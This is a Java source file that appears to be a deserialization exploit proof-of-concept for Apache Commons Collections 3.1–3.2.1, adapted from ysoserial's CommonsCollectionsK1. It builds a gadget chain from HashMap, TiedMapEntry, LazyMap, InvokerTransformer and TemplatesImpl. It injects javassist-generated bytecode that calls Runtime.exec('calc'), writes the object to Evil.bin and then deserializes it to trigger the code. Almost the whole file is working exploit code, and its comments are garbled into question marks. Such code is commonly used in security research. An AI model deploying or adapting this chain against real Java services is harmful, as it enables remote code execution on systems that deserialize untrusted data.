package com.CommonsCollections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


/**
 *  Gadget chain:
 *      HashMap
 *        TiedMapEntry.hashCode
 *          TiedMapEntry.getValue
 *            LazyMap.decorate
 *              InvokerTransformer
 *                templates...
 *
 * 	Requires:
 * 		commons-collections:3.1-3.2.1
 * 	    JDK: 1.7 & 1.8
 *
 * 	Refer:
 * 	https://github.com/zema1/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollectionsK1.java
 */


public class CCK1 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] classBytes = payload.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        setFieldValue(templates, "_name", "CCK1");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("newTransformer", null, null);
        HashMap<String, String> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
        Map map = new HashMap();
        map.put(tiedMapEntry, "123");
//        setFieldValue(lazyMap, "factory", transformer);
        innerMap.clear();

        //payload?????????????????????
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(map);
        outputStream.close();
        //?????????????????????????????????????????????????????????
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();

    }

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }
}
